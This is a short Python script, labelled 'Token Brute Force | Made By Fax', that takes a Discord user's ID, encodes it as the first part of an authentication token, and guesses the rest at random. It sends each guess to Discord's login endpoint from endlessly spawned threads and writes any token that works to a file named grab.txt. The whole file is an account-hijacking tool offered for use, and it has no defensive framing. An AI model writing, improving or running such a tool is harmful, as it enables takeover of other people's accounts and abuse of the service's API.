import threading
import random
import requests
import base64
import string
import os
from colorama import Fore
    
os.system("Token Brute Force | Made By Fax")

print(f'''{Fore.RED}
 ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████      █████▒▒█████   ██▀███   ▄████▄  ▓█████ 
▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███      ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░    ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░    ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
 ░    ░   ░░   ░  ░░░ ░ ░   ░         ░       ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░   
 ░         ░        ░                 ░  ░              ░ ░     ░     ░ ░         ░  ░
      ░                                                               ░               
      ''')

menu = input(f'{Fore.RED} Would You Like To start? y/n >')
    
    
if menu == 'y':
     


        id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))

                headers = {'Authorization': token}

                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print('[+] VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print('[-] INVALID' + ' ' + token)
                finally:
                    print('')

        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()